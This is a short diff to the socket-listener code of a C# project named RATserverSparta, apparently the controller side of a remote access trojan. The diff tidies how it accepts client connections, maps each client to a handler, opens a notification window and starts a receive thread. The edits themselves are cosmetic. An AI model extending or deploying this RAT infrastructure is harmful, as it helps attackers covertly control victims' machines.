@@ -27,7 +27,7 @@ namespace RATserverSparta.Sockets
 
         public void Accept(System.Net.Sockets.Socket Socket)
         {
-            while(true)
+            while (true)
             {
                 try
                 {
@@ -36,7 +36,11 @@ namespace RATserverSparta.Sockets
                     Client.Client ClientClassInstance = new Client.Client(GUI_Instance, client);
                     OnNewConnection.Invoke(ClientClassInstance, client);
                 }
-                catch { }
+                catch
+                {
+                    MessageBox.Show("catch - error occured, plepase check why.");
+                    break;
+                }
             }
         }
 
@@ -53,22 +57,22 @@ namespace RATserverSparta.Sockets
             //Mapping each Client RemoteEndPoint string into his Main class communication instance:
             //This is how we can choose right click on client at the GUI, and send to this specific client the things we need.
             this.ClientInstanceMap[client.RemoteEndPoint.ToString()] = ClientClassInstance;
-            //Doint the same for Socket
+            //Doing the same for Socket
             this.ClientSocketMap[client.RemoteEndPoint.ToString()] = client;
 
             //Showing new connection GUI
-            new Thread((() =>
+            new Thread(() =>
             {
                 NewconnectionGUI newconnectionGUI = new NewconnectionGUI(client.RemoteEndPoint.ToString());
                 newconnectionGUI.ShowDialog();
-            })).Start();
+            }).Start();
 
             //Sending each client to his own class instance
-            new Thread((() =>
+            new Thread(() =>
             {
                 ClientClassInstance.Setup();
                 ClientClassInstance.Receive();
-            })).Start();
+            }).Start();
         }
     }
 }
